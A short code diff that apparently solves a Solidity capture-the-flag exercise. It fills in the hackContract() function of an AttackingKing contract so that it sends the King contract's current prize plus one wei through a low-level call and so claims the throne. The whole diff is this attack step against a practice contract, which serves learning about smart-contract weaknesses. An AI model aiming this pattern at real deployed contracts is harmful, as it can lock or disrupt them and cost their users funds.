@@ -11,6 +11,14 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+
+        King king = King(payable(contractAddress));
+        
+        uint prize = king.prize() + 1;
+       
+        contractAddress.call{value : prize}("");
+
     }
+
+
 }
